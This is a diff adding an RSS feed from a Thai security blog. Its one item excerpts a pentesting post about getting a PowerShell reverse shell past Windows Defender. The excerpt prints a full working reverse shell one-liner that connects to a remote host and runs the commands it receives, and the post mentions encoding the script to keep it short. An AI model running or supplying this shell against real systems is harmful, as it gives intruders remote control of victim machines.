@@ -1,0 +1,26 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>SUAM</title>
+    <link>https://suam.wtf/authors/bongtrop/</link>
+    <description>Recent content on SUAM</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Tue, 30 Jun 2020 00:00:00 +0000</lastBuildDate>
+    
+	<atom:link href="https://suam.wtf/authors/bongtrop/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>What The Fuck Do You Want Windows Defender?</title>
+      <link>https://suam.wtf/post/wtf-do-you-want-windows-defender/</link>
+      <pubDate>Tue, 30 Jun 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://suam.wtf/post/wtf-do-you-want-windows-defender/</guid>
+      <description>เรื่องของเรื่องคือ ผมพยายามหา Powershell Script สั้น ๆ ที่ใช้สำหรับทำ Reverse Shell มาใช้สำหรับทำ Pentest ผมไปเจอตัวหนึ่งของคุณ @nikhil_mitt โดยมีหน้าตาประมาณนี้ครับ
+$client = New-Object System.Net.Sockets.TCPClient(&amp;quot;192.168.1.110&amp;quot;,1234); $stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String ); $sendback2 = $sendback + &amp;quot;PS &amp;quot; + (pwd).Path + &amp;quot;&amp;gt; &amp;quot;; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush(); }; $client.Close();  เต็ม ๆ อ่านที่ Link นี้นะครับ
+ผมชอบมากเลยครับเพราะว่าหลังจากเอาไป Minify, Encode และทำเป็น One Line แล้วมันสั้นดี จะได้ประมาณนี้ครับ</description>
+    </item>
+    
+  </channel>
+</rss>
